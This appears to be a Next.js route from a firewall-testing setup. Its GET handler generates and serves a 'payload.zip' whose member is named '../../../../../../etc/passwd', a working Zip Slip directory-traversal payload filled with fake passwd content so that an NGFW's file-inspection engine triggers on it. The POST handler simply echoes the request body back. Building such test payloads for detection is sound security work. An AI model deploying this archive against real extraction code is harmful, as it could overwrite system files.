import { NextResponse } from 'next/server';

// Helper to write a 32-bit little-endian value into a Uint8Array
function writeUint32LE(arr: Uint8Array, offset: number, value: number) {
    arr[offset]     = value & 0xFF;
    arr[offset + 1] = (value >> 8) & 0xFF;
    arr[offset + 2] = (value >> 16) & 0xFF;
    arr[offset + 3] = (value >> 24) & 0xFF;
}

// Helper to write a 16-bit little-endian value into a Uint8Array
function writeUint16LE(arr: Uint8Array, offset: number, value: number) {
    arr[offset]     = value & 0xFF;
    arr[offset + 1] = (value >> 8) & 0xFF;
}

export async function GET() {
    // T1190 - Exploit Public-Facing Application → Compromise category
    //
    // ZIP Slip exploit: ZIP archive with directory traversal in member filename.
    // Targets: File-Member-Name_Directory-Traversal-In-File-Name
    //
    // The ZIP is padded to ~10KB to ensure the NGFW's file inspection engine
    // fully buffers and scans the file before forwarding to the client.

    const traversalName = '../../../../../../etc/passwd';
    const fnBytes = new TextEncoder().encode(traversalName);

    // Generate ~8KB of realistic /etc/passwd content for reliable file inspection
    const passwdLines = [
        'root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
        'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
        'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
        'sync:x:4:65534:sync:/bin:/bin/sync',
        'games:x:5:60:games:/usr/games:/usr/sbin/nologin',
        'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin',
        'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin',
        'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin',
        'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin',
        'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin',
        'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',
        'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin',
        'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin',
        'mysql:x:106:112:MySQL Server,,,:/var/lib/mysql:/bin/false',
        'postgres:x:107:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash',
    ];
    // Repeat to reach ~8KB
    let content = '';
    while (content.length < 8192) {
        content += passwdLines.join('\n') + '\n';
    }
    const fileContent = new TextEncoder().encode(content);

    // ZIP Local File Header (30 bytes fixed)
    const localHeader = new Uint8Array(30);
    localHeader.set([0x50, 0x4B, 0x03, 0x04], 0); // PK\x03\x04 magic
    writeUint16LE(localHeader, 4, 20);              // Version needed (2.0)
    writeUint32LE(localHeader, 18, fileContent.length); // Compressed size
    writeUint32LE(localHeader, 22, fileContent.length); // Uncompressed size
    writeUint16LE(localHeader, 26, fnBytes.length);     // Filename length

    // ZIP Central Directory Header (46 bytes fixed)
    const localSize = 30 + fnBytes.length + fileContent.length;
    const centralHeader = new Uint8Array(46);
    centralHeader.set([0x50, 0x4B, 0x01, 0x02], 0); // Central dir signature
    writeUint16LE(centralHeader, 4, 20);              // Version made by
    writeUint16LE(centralHeader, 6, 20);              // Version needed
    writeUint32LE(centralHeader, 20, fileContent.length); // Compressed size
    writeUint32LE(centralHeader, 24, fileContent.length); // Uncompressed size
    writeUint16LE(centralHeader, 28, fnBytes.length);     // Filename length

    // End of Central Directory (22 bytes)
    const centralSize = 46 + fnBytes.length;
    const endRecord = new Uint8Array(22);
    endRecord.set([0x50, 0x4B, 0x05, 0x06], 0);     // End signature
    writeUint16LE(endRecord, 8, 1);                   // Entries in central dir
    writeUint16LE(endRecord, 10, 1);                  // Total entries
    writeUint32LE(endRecord, 12, centralSize);        // Central dir size
    writeUint32LE(endRecord, 16, localSize);          // Central dir offset

    // Assemble complete ZIP file
    const totalSize = localSize + centralSize + 22;
    const zip = new Uint8Array(totalSize);
    let offset = 0;
    zip.set(localHeader, offset); offset += 30;
    zip.set(fnBytes, offset); offset += fnBytes.length;
    zip.set(fileContent, offset); offset += fileContent.length;
    zip.set(centralHeader, offset); offset += 46;
    zip.set(fnBytes, offset); offset += fnBytes.length;
    zip.set(endRecord, offset);

    return new Response(zip, {
        status: 200,
        headers: {
            'Content-Type': 'application/zip',
            'Content-Disposition': 'attachment; filename="payload.zip"',
            'Content-Length': String(totalSize),
            'Cache-Control': 'no-store, no-cache, must-revalidate',
        },
    });
}

export async function POST(req: Request) {
    let payload = '';
    try {
        payload = await req.text();
    } catch (e) {
        // ignore
    }

    return NextResponse.json({
        status: 'allowed',
        message: 'POST request reached the origin server successfully.',
        payload_received: payload.substring(0, 200)
    });
}
